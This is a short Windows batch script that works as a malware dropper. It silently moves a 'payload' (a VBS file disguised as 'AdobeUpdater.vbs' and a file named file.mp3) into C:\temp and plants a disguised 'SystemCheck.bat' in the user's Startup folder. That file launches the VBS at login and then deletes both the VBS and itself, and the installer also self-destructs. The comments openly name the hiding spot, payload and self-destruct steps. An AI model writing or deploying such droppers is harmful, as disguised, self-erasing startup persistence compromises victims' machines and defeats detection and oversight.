@echo off
set "targetDir=C:\temp"
set "startupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

:: 1. Create the hiding spot (silently)
if not exist "%targetDir%" mkdir "%targetDir%" >nul 2>&1

:: 2. Move the payload to the hiding spot
move /y "%~dp0file.mp3" "%targetDir%\" >nul
move /y "%~dp0AdobeUpdater.vbs" "%targetDir%\" >nul

:: 3. Create the "Fire and Forget" Trigger in the Startup folder
(
echo @echo off
echo start "" wscript.exe "%targetDir%\AdobeUpdater.vbs"
echo timeout /t 2 /nobreak ^> nul
echo del "%targetDir%\AdobeUpdater.vbs"
echo del "%%~f0"
) > "%startupDir%\SystemCheck.bat"

:: 4. Self-destruct the setup installer
del "%~f0"